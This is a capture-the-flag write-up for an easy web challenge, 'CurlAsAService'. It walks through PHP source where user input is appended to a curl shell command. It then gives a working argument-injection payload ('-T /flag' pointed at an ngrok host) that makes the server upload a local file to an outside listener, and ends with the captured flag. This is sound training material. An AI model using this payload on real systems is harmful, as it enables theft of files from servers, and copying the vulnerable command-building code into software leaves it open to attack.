# **Introduction**

cURL As A Service or CAAS is a brand new Alien application, built so that humans can test the status of their websites. However, it seems that the Aliens have not quite got the hang of Human programming and the application is riddled with issues.

---
# **Basic Information**

Name: **CurlAsAService**
Category: **Web**
Difficulty: **Easy**
Date: **August 14, 2026**

---
# **Recon**

Initial scan with **`nmap`**:

```
$ sudo nmap -A -p 30007 165.22.111.214 -oN nmap.txt     

Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 21:25 -0700
Nmap scan report for 165.22.111.214
Host is up (0.057s latency).

PORT      STATE SERVICE VERSION
30007/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Health Check
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.19 (95%), Linux 5.0 - 5.14 (95%), Linux 5.10 (95%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (95%), Linux 2.6.32 - 3.13 (90%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 5.14 - 6.8 (90%), OpenWrt 22.03 (Linux 5.10) (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 11 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.44 seconds

```

The scan does not reveal much aside from the web application running on port **`30007`** using **`nginx 1.18.0`**.  

---

Since the source code was provided with the challenge, the next step was to extract the files and inspect how the application works.

![[Pasted image 20260814215617.png]]

Looking at the source code: 

### **`/Router.php`**

```
<?php
class Router
{
    private $routes = [];

    public function new($method, $path, $handler)
    {
        $this->routes[] = ['method' => $method, 'path' => $path, 'handler' => $handler];
    }

    public function match()
    {
        $method = $_SERVER['REQUEST_METHOD'];
        $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

        foreach ($this->routes as $route) {
            if ($route['method'] === $method && $route['path'] === $path) {
                list($controller, $action) = explode('@', $route['handler']);
                $ctrl = new $controller();
                return $ctrl->$action($this);
            }
        }
        http_response_code(404);
        return '404 Not Found';
    }

    public function view($name)
    {
        ob_start();
        include "views/${name}.php";
        return ob_get_clean();
    }
}
```

There is nothing immediately exploitable here, but the router shows how the application handles requests and loads pages from the **`views/`** directory.

---
### **`controllers/CurlController.php`**

```
<?php
class CurlController
{
    public function index($router)
    {
        return $router->view('index');
    }

    public function execute($router)
    {
        $url = $_POST['ip'];

        if (isset($url)) {
            $command = new CommandModel($url);
            return json_encode([ 'message' => $command->exec() ]);
        }
    }
}
```

This part is more interesting.

The application takes the value submitted through the POST parameter:

```
$_POST['ip']
```

and passes it directly into the `CommandModel`.

This means the user-controlled value eventually becomes part of a system command.

---
### **`models/CommandModel.php`**

```
<?php
class CommandModel
{
    public function __construct($url)
    {
        $this->command = "curl --proto =http,https -sSL " . escapeshellcmd($url) . " 2>&1";
    }

    public function exec()
    {
        $output = shell_exec($this->command);
        return $output;
    }
}
```

This is where the main vulnerability appears.

The application builds a command like this:

```
curl --proto =http,https -sSL <USER_INPUT> 2>&1
```

The user-controlled value is passed through `escapeshellcmd()`, which prevents many traditional shell meta character-based command injection techniques.

However, the input is still appended directly to the `curl` command.

Because spaces are still allowed, the input can be interpreted as additional **curl arguments and options**.

So instead of injecting a completely separate shell command, we can manipulate the arguments passed to `curl`.

---
# **Initial Attempt**

My first thought was to try reading the flag directly using the `file://` protocol.

![[Pasted image 20260814223427.png|697]]

However, this did not work.

The command explicitly restricts curl to:

```
--proto =http,https
```

which means only the **HTTP** and **HTTPS** protocols are allowed.

So I needed another way to make curl read the local file.

---
# **Exploitation**

I checked the curl manual for file-related options:

```
man curl | grep file
```

After checking the available curl options, I found that `-T` can be used to upload a local file.

```
-T, --upload-file <file>
        Upload the specified local file to the remote URL.
```

So if I can inject additional curl arguments, I can make the server upload `/flag` to a server I control.

---
## **Setting Up a Listener**

I used **`ngrok`** to expose my local machine to the internet.

```

$ ngrok http 8000

ngrok                                                                                                    
Session Status                online                                             Account                       [REDACTED]
Version                       3.39.11                                            Region                        Asia Pacific (ap)                                  Latency                       48ms
Web Interface                 http://127.0.0.1:4040                                                                                         
Forwarding                    https://dandelion-kiln-trillion.ngrok-free.dev -> http://localhost:8000                                       

Connections                   ttl     opn     rt1     rt5     p50     p90                                                                   
                              0       0       0.00    0.00    0.00    0.00 
```

Next, I started a **Netcat** listener:

```
$ nc -lvnp 8000
listening on [any] 8000 ...
```

---
## **Sending the Payload**

***Note:***  The challenge instance was restarted during testing, so the application port changed from `30007` to `36319`.

```
$ curl -X POST http://165.22.111.214:36319/api/curl -d "ip=-T /flag https://dandelion-kiln-trillion.ngrok-free.dev"
```

Since curl interprets this as an upload option, it reads the local file and sends it to an external HTTP or HTTPS server.

---
## **Output**

On the Netcat listener, I received the following request:

```
$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 34460
PUT /flag HTTP/1.1
Host: dandelion-kiln-trillion.ngrok-free.dev
User-Agent: curl/7.74.0
Content-Length: 33
Accept: */*
X-Forwarded-For: 165.22.111.214
X-Forwarded-Host: dandelion-kiln-trillion.ngrok-free.dev
X-Forwarded-Proto: https
Accept-Encoding: gzip

NXS{f1l3_r3tr13v4l_4s_4_s3rv1c3}
```

The contents of the `/flag` file were successfully sent to my server.

---
## **Flag**

**NXS{f1l3_r3tr13v4l_4s_4_s3rv1c3}**
